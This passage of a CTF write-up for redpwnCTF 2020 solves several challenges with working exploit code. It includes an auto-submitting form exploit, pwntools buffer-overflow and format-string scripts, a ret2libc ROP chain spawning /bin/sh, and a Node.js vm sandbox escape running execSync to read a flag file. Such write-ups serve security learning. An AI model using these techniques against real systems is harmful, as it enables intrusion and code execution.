-    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">'formresponse1'</span> <span class="na">width</span><span class="o">=</span><span class="s">'350px'</span> <span class="na">height</span><span class="o">=</span><span class="s">'100px'</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">'0'</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
-    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>  
-    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">'iframe_container'</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">'formresponse2'</span> <span class="na">width</span><span class="o">=</span><span class="s">'350px'</span> <span class="na">height</span><span class="o">=</span><span class="s">'100px'</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">'0'</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
-    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">'iframe_container'</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">'formresponse3'</span> <span class="na">width</span><span class="o">=</span><span class="s">'350px'</span> <span class="na">height</span><span class="o">=</span><span class="s">'100px'</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">'0'</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
-    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">'iframe_container'</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">'formresponse4'</span> <span class="na">width</span><span class="o">=</span><span class="s">'350px'</span> <span class="na">height</span><span class="o">=</span><span class="s">'100px'</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">'0'</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
-    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">'iframe_container'</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">'formresponse5'</span> <span class="na">width</span><span class="o">=</span><span class="s">'350px'</span> <span class="na">height</span><span class="o">=</span><span class="s">'100px'</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">'0'</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
-    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">'iframe_container'</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">'formresponse6'</span> <span class="na">width</span><span class="o">=</span><span class="s">'350px'</span> <span class="na">height</span><span class="o">=</span><span class="s">'100px'</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">'0'</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
-    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">'iframe_container'</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">'formresponse7'</span> <span class="na">width</span><span class="o">=</span><span class="s">'350px'</span> <span class="na">height</span><span class="o">=</span><span class="s">'100px'</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">'0'</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
-    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">'iframe_container'</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">'formresponse8'</span> <span class="na">width</span><span class="o">=</span><span class="s">'350px'</span> <span class="na">height</span><span class="o">=</span><span class="s">'100px'</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">'0'</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
-    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">'iframe_container'</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">'formresponse9'</span> <span class="na">width</span><span class="o">=</span><span class="s">'350px'</span> <span class="na">height</span><span class="o">=</span><span class="s">'100px'</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">'0'</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
-    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">'iframe_container'</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">'formresponse10'</span> <span class="na">width</span><span class="o">=</span><span class="s">'350px'</span> <span class="na">height</span><span class="o">=</span><span class="s">'100px'</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">'0'</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
-    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">'iframe_container'</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">'formresponse11'</span> <span class="na">width</span><span class="o">=</span><span class="s">'350px'</span> <span class="na">height</span><span class="o">=</span><span class="s">'100px'</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">'0'</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
-    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">'iframe_container'</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">'formresponse12'</span> <span class="na">width</span><span class="o">=</span><span class="s">'350px'</span> <span class="na">height</span><span class="o">=</span><span class="s">'100px'</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">'0'</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
-    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">'iframe_container'</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">'formresponse13'</span> <span class="na">width</span><span class="o">=</span><span class="s">'350px'</span> <span class="na">height</span><span class="o">=</span><span class="s">'100px'</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">'0'</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
-    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">'iframe_container'</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">'formresponse14'</span> <span class="na">width</span><span class="o">=</span><span class="s">'350px'</span> <span class="na">height</span><span class="o">=</span><span class="s">'100px'</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">'0'</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
-    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">'iframe_container'</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">'formresponse15'</span> <span class="na">width</span><span class="o">=</span><span class="s">'350px'</span> <span class="na">height</span><span class="o">=</span><span class="s">'100px'</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">'0'</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
-    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">'iframe_container'</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">'formresponse16'</span> <span class="na">width</span><span class="o">=</span><span class="s">'350px'</span> <span class="na">height</span><span class="o">=</span><span class="s">'100px'</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">'0'</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
-    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">'iframe_container'</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">'formresponse17'</span> <span class="na">width</span><span class="o">=</span><span class="s">'350px'</span> <span class="na">height</span><span class="o">=</span><span class="s">'100px'</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">'0'</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
-    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">'iframe_container'</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">'formresponse18'</span> <span class="na">width</span><span class="o">=</span><span class="s">'350px'</span> <span class="na">height</span><span class="o">=</span><span class="s">'100px'</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">'0'</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
-    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">'iframe_container'</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">'formresponse19'</span> <span class="na">width</span><span class="o">=</span><span class="s">'350px'</span> <span class="na">height</span><span class="o">=</span><span class="s">'100px'</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">'0'</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
-    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">'iframe_container'</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">'formresponse20'</span> <span class="na">width</span><span class="o">=</span><span class="s">'350px'</span> <span class="na">height</span><span class="o">=</span><span class="s">'100px'</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">'0'</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
-    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">'iframe_container'</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">'formresponse21'</span> <span class="na">width</span><span class="o">=</span><span class="s">'350px'</span> <span class="na">height</span><span class="o">=</span><span class="s">'100px'</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">'0'</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
-    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">'iframe_container'</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">'formresponse22'</span> <span class="na">width</span><span class="o">=</span><span class="s">'350px'</span> <span class="na">height</span><span class="o">=</span><span class="s">'100px'</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">'0'</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
-    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">'iframe_container'</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">'formresponse23'</span> <span class="na">width</span><span class="o">=</span><span class="s">'350px'</span> <span class="na">height</span><span class="o">=</span><span class="s">'100px'</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">'0'</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
-    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">'iframe_container'</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">'formresponse24'</span> <span class="na">width</span><span class="o">=</span><span class="s">'350px'</span> <span class="na">height</span><span class="o">=</span><span class="s">'100px'</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">'0'</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
-    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">'iframe_container'</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">'formresponse25'</span> <span class="na">width</span><span class="o">=</span><span class="s">'350px'</span> <span class="na">height</span><span class="o">=</span><span class="s">'100px'</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">'0'</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
-    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
-
-    <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
-        <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">index</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">index</span> <span class="o">&lt;</span> <span class="mi">12</span><span class="p">;</span> <span class="nx">index</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
-          <span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="nx">index</span><span class="p">].</span><span class="nx">target</span> <span class="o">=</span> <span class="p">(</span><span class="s1">'formresponse'</span> <span class="o">+</span> <span class="p">(</span><span class="nx">index</span><span class="o">+</span><span class="mi">1</span><span class="p">))</span>
-        <span class="p">}</span>
-        <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">index</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">index</span> <span class="o">&lt;</span> <span class="mi">12</span><span class="p">;</span> <span class="nx">index</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
-          <span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="nx">index</span><span class="p">].</span><span class="nx">submit</span><span class="p">();</span>
-        <span class="p">}</span>
-    <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
-  <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
-<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
-</code></pre></div>
-<p>I know its a bad code, but who cares about "good" code when creating exploit :v</p>
-<p>anyway here's the flag</p>
-<p>flag = <code>flag{n0_m0r3_gu3551ng}</code></p>
-<p>For a record, after looking at other people's writeup I just surprised that I can use XMLHttpRequest instead of doing this stupid iframe things :(</p>
-<h1>coffer-overflow-0</h1>
-<blockquote>
-<p>Can you fill up the coffers? We even managed to find the source for you. <br/>
-  nc 2020.redpwnc.tf 31199  </p>
-</blockquote>
-<p>just send a string with very long character and it will overflow the value of variable code. <br/>
-flag : <code>flag{b0ffer_0verf10w_3asy_as_123}</code> </p>
-<h1>coffer-overflow-1</h1>
-<blockquote>
-<p>The coffers keep getting stronger! You'll need to use the source, Luke. <br/>
-  nc 2020.redpwnc.tf 31255  </p>
-</blockquote>
-<p>this time we need to actually control a value, this can be done by filling the buffer until 8 bytes before rbp and fill the 8 bytes with value <code>0xcafebabe</code> </p>
-<div class="codehilite"><pre><span></span><code><span class="kn">import</span> <span class="nn">pwn</span>
-
-<span class="n">r</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">remote</span><span class="p">(</span><span class="s2">"2020.redpwnc.tf"</span><span class="p">,</span> <span class="mi">31255</span><span class="p">)</span>
-<span class="c1"># r = pwn.process("coffer-overflow-1")</span>
-<span class="n">payload</span> <span class="o">=</span> <span class="s2">"A"</span><span class="o">*</span><span class="mi">24</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xcafebabe</span><span class="p">)</span>
-<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</code></pre></div>
-<p>flag : <code>flag{th1s_0ne_wasnt_pure_gu3ssing_1_h0pe}</code> </p>
-<h1>coffer-overflow-2</h1>
-<blockquote>
-<p>You'll have to jump to a function now!? <br/>
-  nc 2020.redpwnc.tf 31908  </p>
-</blockquote>
-<p>this time we need to jump into <code>binFunction</code> function, this can be done by filling the buffer until it hit rbp and overflow the buffer with <code>binFunction</code> address  </p>
-<div class="codehilite"><pre><span></span><code><span class="kn">import</span> <span class="nn">pwn</span>
-
-<span class="n">pad</span> <span class="o">=</span> <span class="s2">"A"</span> <span class="o">*</span> <span class="mi">16</span>
-<span class="n">win</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x00000000004006e6</span><span class="p">)</span>
-<span class="n">ret</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x000000000040053e</span><span class="p">)</span>
-<span class="n">payload</span> <span class="o">=</span> <span class="n">pad</span><span class="o">+</span><span class="n">ret</span><span class="o">+</span><span class="n">win</span>
-
-<span class="n">r</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">remote</span><span class="p">(</span><span class="s2">"2020.redpwnc.tf"</span><span class="p">,</span> <span class="mi">31908</span><span class="p">)</span>
-<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</code></pre></div>
-<p>flag : <code>flag{ret_to_b1n_m0re_l1k3_r3t_t0_w1n}</code> </p>
-<h1>secret-flag</h1>
-<blockquote>
-<p>There's a super secret flag in printf that allows you to LEAK the data at an address?? <br/>
-  nc 2020.redpwnc.tf 31826 <br/>
-  if you look at the program on your dissasembler, you can see that our input become an argument on the printf function, however the program didn't call the printf properly, so we can input the string format <code>%s</code> and it will print a string somewhere from the stack, to control it simply do <code>%n$s</code> and it will print a random nth string somewhere from the stack.  </p>
-</blockquote>
-<div class="codehilite"><pre><span></span><code><span class="kn">import</span> <span class="nn">pwn</span>
-
-<span class="n">response</span> <span class="o">=</span> <span class="s2">""</span>
-<span class="n">i</span> <span class="o">=</span> <span class="mi">1</span>
-<span class="k">while</span> <span class="s1">'flag'</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">response</span><span class="p">:</span>
-    <span class="c1"># print(i)</span>
-    <span class="nb">print</span><span class="p">(</span><span class="s2">"%"</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s2">"$s"</span><span class="p">)</span>
-    <span class="k">try</span><span class="p">:</span>
-        <span class="n">r</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">remote</span><span class="p">(</span><span class="s2">"2020.redpwnc.tf"</span><span class="p">,</span> <span class="mi">31826</span><span class="p">)</span>
-        <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">"adventurer?</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span><span class="s2">"%"</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s2">"$s"</span><span class="p">)</span>
-        <span class="n">response</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
-        <span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="p">)</span>
-        <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
-        <span class="n">r</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
-    <span class="k">except</span><span class="p">:</span>
-        <span class="k">pass</span>
-<span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="p">)</span>
-</code></pre></div>
-<p>flag : <code>flag{n0t_s0_s3cr3t_f1ag_n0w}</code></p>
-<h1>the-library</h1>
-<blockquote>
-<p>There's not a lot of useful functions in the binary itself. I wonder where you can get some... <br/>
-  nc 2020.redpwnc.tf 31350 <br/>
-  This is a ret2libc challenge, I got the code and explanation <a href="https://tasteofsecurity.com/security/ret2libc-unknown-libc/" target="_blank">here</a> <br/>
-  So basically we want to pop the value /bin/sh into RDI, the call system, system will read what to execute from RDI, thus executes /bin/sh</p>
-</blockquote>
-<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span> 
-<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">"2020.redpwnc.tf"</span><span class="p">,</span> <span class="mi">31350</span><span class="p">)</span>
-<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">"./the-library"</span><span class="p">)</span>
-<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">"libc.so.6"</span><span class="p">)</span>
-<span class="n">payload</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">elf</span><span class="p">)</span>
-
-<span class="n">pop_rdi</span> <span class="o">=</span> <span class="p">(</span><span class="n">payload</span><span class="o">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s1">'pop rdi'</span><span class="p">,</span> <span class="s1">'ret'</span><span class="p">]))[</span><span class="mi">0</span><span class="p">]</span>
-<span class="n">libc_start_main</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">'__libc_start_main'</span><span class="p">]</span>
-<span class="n">puts_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">'puts'</span><span class="p">]</span>
-<span class="n">main</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">'main'</span><span class="p">]</span>
-<span class="n">ret</span> <span class="o">=</span> <span class="p">(</span><span class="n">payload</span><span class="o">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s1">'ret'</span><span class="p">]))[</span><span class="mi">0</span><span class="p">]</span>
-<span class="n">pad</span> <span class="o">=</span> <span class="s2">"A"</span><span class="o">*</span><span class="mi">16</span> <span class="o">+</span> <span class="s2">"B"</span><span class="o">*</span><span class="mi">8</span>
-<span class="n">payload</span> <span class="o">=</span> <span class="n">pad</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_start_main</span><span class="p">)</span> <span class="o">+</span>  <span class="n">p64</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">main</span><span class="p">)</span>
-
-<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">"?</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
-<span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
-<span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
-
-<span class="n">leak</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
-<span class="n">leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">leak</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="p">))</span>
-<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">"__libc_start_main"</span><span class="p">]</span>
-<span class="n">bin_sh</span> <span class="o">=</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s2">"/bin/sh"</span><span class="p">))</span> 
-<span class="n">system</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">"system"</span><span class="p">]</span>
-<span class="n">payload</span> <span class="o">=</span> <span class="n">pad</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
-
-<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">"?</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
-<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</code></pre></div>
-<p>flag : <code>flag{jump_1nt0_th3_l1brary}</code></p>
-<h1>uglybash</h1>
-<blockquote>
-<p>This bash script evaluates to echo dont just run it, dummy # flag{...} where the flag is in the comments. <br/>
-  The comment won't be visible if you just execute the script. How can you mess with bash to get the value right before it executes? <br/>
-  Enjoy the intro misc chal.  </p>
-</blockquote>
-<p>My way on solving this challenge is by changing the <code>eval</code> command (was <code>e$'\u0076'al</code>) into <code>printf '%s\n</code>, then run it, and from the output, change the <code>/bin/bash</code> command (was <code>$BASH ${*%%Y#0C}   ${*,,} &lt;&lt;&lt;</code>) into <code>printf '%s\n'</code> and run it. <br/>
-flag : <code>flag{us3_zsh,_dummy}</code></p>
-<h1>CaaSiNO</h1>
-<blockquote>
-<p>This is a vm jail challenge written in <strong>javascript</strong> <br/>
-  It utilizing this vm thing in javascript to create a child process and run every input in a new context so that we could'nt touch the parent context and read the flag  </p>
-</blockquote>
-<p>However there's a flaw in vm javascript that we can use to abuse the system and touch the parent context to be able to read the flag (more on this <a href="https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html" target="_blank">here</a>)</p>
-<p>and then i use this script to read the flag</p>
-<div class="codehilite"><pre><span></span><code><span class="k">this</span>
-    <span class="p">.</span><span class="nx">constructor</span>
-    <span class="p">.</span><span class="nx">constructor</span><span class="p">(</span><span class="s1">'return this.process'</span><span class="p">)()</span>
-    <span class="p">.</span><span class="nx">mainModule</span>
-    <span class="p">.</span><span class="nx">require</span><span class="p">(</span><span class="s1">'child_process'</span><span class="p">)</span>
-    <span class="p">.</span><span class="nx">execSync</span><span class="p">(</span><span class="s1">'cat /ctf/flag.txt'</span><span class="p">)</span>
-    <span class="p">.</span><span class="nx">toString</span><span class="p">()</span>
-</code></pre></div>
-<p><code>flag{vm_1snt_s4f3_4ft3r_41l_29ka5sqD}</code></p>
 
 </div>
     </div>
